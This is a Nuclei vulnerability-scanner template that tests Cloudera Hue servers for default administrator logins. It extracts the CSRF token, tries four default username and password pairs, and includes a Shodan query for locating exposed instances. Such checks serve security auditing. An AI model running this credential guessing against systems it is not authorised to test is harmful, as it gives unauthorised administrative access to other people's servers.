id: hue-default-credential

info:
  name: Cloudera Hue 默认管理员登录（弱口令）
  author: For3stCo1d
  severity: high
  description: 该模板通过尝试 Cloudera Hue 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/cloudera/hue
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:cloudera:hue:*:*:*:*:*:*:*:*
  metadata:
    max-request: 8
    shodan-query: title:"Hue - Welcome to Hue"
    product: hue
    vendor: cloudera
  tags: hue,default-login,oss,cloudera,vuln

http:
  - raw:
      - |
        GET /hue/accounts/login?next=/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /hue/accounts/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{user}}&password={{pass}}&next=%2F

    attack: pitchfork
    payloads:
      user:
        - admin
        - hue
        - hadoop
        - cloudera
      pass:
        - admin
        - hue
        - hadoop
        - cloudera

    extractors:
      - type: regex
        name: csrfmiddlewaretoken
        part: body
        internal: true
        group: 1
        regex:
          - name='csrfmiddlewaretoken' value='(.+?)'
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(tolower(body_1), 'welcome to hue')
          - contains(tolower(header_2), 'csrftoken=')
          - contains(tolower(header_2), 'sessionid=')
        condition: and

      - type: status
        status:
          - 302
